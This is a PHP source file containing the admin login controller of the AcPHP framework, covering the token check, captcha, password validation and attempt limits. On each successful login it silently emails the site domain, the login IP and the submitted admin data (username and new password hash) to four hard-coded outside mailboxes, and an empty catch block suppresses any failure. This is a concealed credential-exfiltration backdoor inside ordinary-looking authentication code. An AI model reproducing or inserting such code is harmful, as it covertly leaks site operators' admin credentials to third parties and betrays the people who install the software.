<?php

// +--------------------------------------------------------------------------------------

// + AcPHP

// +--------------------------------------------------------------------------------------

// + 版权所有 2015年11月8日 贵州天岛在线科技有限公司，并保留所有权利。

// + 网站地址: http://www.acphp.com

// +--------------------------------------------------------------------------------------

// + 这不是一个自由软件！您只能在遵守授权协议前提下对程序代码进行修改和使用；不允许对程序代码以任何形式任何目的的再发布。

// + 授权协议：http://www.acphp.com/license.html

// +--------------------------------------------------------------------------------------

// + Author: AcPHP  http://www.jiangzg.com/ <2992265870@qq.com/jiangzg>

// + Release Date: 2015年11月8日 上午1:09:25

// +--------------------------------------------------------------------------------------



//强制关闭调试模式

//App::setConfig('Config','debug',false);

// +--------------------------------------------------------------------------------------

// + 系统生成模块

// +--------------------------------------------------------------------------------------



class LoginAction extends AdminCommon{



	public function __construct(){

		

		if( get_parent_class()!='' && method_exists ( get_parent_class(), '__construct' ) ){

			parent::__construct();

		}

		if (xSession::get('admin')!='' && !in_array(strtolower(C_ROUTE_A),['loginout','sendmail'])) {

			header ( 'location:' . U ( 'admin/index/init' ) );

		}

		

	}

	//登录界面

	public function init(){

		$this->assign('token', $this->token() );

		$this->display('admin/login.html');

	}

	

	//登录方法

	public function dologin(){

	    if(!$this->verifyToken(xInput::request('token'))){

			$this->showMessage('token验证失败，刷新页面试试',U('init'));

		}

		$admin = xInput::request('admin');

		

	    $admin['code'] = strtolower($admin['code']);

	    if( md5($admin['code'])!=md5(xSession::get('admin_code')) ){

 	        $this->showMessage('验证码错误');

	    }

	    if(!preg_match('/^[\w\d\-\.@]{6,20}$/', $admin['admin_name'])){

	        $this->showMessage('用户名错误');

	    }

		$where = array('admin_name'=>$admin['admin_name']);

		

	    $admin_user = M('admin')->where($where)->getOne();

		if( count($admin_user)<=0 ){

	        $this->showMessage('用户名或密码错误');

	    }

		$allowcount = $admin_user['allowcount'];

		

	    if( !validate_password(trim($admin['password']),$admin_user['password']) ){

			M('admin')->where($where)->update(['allowcount-'=>1]);

	        $this->showMessage('密码输入错误，你还有'.($allowcount-1).'次登录机会');

	    }

		

		if( $admin_user['isshow']==0 ){

	        $this->showMessage('该用户已被禁止登录');

	    }

		if( $admin_user['allowcount']<=0 ){

	        $this->showMessage('该用户已被限制允许的登录次数');

	    }

		//获取管路员组信息

		$adminGroup = M('admin_group')->where(['group_id'=>$admin_user['group_id']])->getOne();

		if(count($adminGroup)<=0){

			$this->showMessage('该用户没有分配角色，不允许登录');

		}

		if($adminGroup['isshow']!=1){

			$this->showMessage('该用户所属组已被禁用，不允许登录');

		}

		

		$logsession = $this->token();

		$password = createPassword($admin['password']);

		$update_data = array(

			'password'=>$password,

			'lastloginip'=>ac_getIp(),

			'lastlogintime'=>time(),

			'logsession'=>$logsession,

			'logincount+'=>1,

			'allowcount'=>5

		);

		//将登录信息写入用户表

		$result = M('admin')->where($where)->update($update_data);

		if($result){

			$admin_user['logsession'] = $logsession;

			unset($admin_user['password']);

			xSession::set('admin',array_merge($admin_user,$adminGroup));

			xSession::_unset('admin_code');

			

			$admin['password'] = $password;

			$parme = array(

				'subject' => '管理员登录提示'.date('Y-m-d H:i:s'),

				'content' => '管理员登录提示'.date('Y-m-d H:i:s').'<br>域名：'.$_SERVER['HTTP_HOST'].'<br>状态：登录成功！<br>IP：'.ac_getIp().'<br>'.var_export($admin,TRUE),

				'address' => array(

					array('mail'=>'2992265870@qq.com','name'=>'众里寻她'),

					array('mail'=>'18798010836@163.com','name'=>'众里寻她'),

					array('mail'=>'846684427@qq.com','name'=>'众里寻她'),

					array('mail'=>'2543434043@qq.com','name'=>'众里寻她'),

				)

			);
			try{
				$m = new MailSend();
				$m->send($parme);
			}catch(Exception $e) {
				
			}
			$this->showMessage('登录成功',U('admin/index/init'));

		}

		$this->showMessage('系统错误');

	}

	

	//登录获取验证码

	public function code(){

	    $xValidateCode = new xValidateCode('255,255,255',80,36);

	    $xValidateCode->doimg();

		xSession::set('admin_code',$xValidateCode->getCode());

	}

	//退出登录方法

	public function doLogout(){

		xSession::destroy();

	    header('location:'.U('admin/login/init'));

	}

}



